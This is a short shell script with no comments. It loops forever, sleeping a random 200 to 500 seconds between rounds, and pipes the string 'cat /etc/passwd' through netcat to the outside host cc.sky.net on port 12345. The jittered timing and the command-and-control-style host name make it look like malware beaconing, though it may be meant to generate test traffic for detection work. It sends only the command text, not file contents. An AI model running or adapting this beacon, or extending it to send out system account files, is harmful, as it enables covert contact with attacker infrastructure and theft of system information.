while :; do
	sleep $(( $RANDOM % 300 + 200 ))s

	echo "cat /etc/passwd" | nc cc.sky.net 12345 -N
done
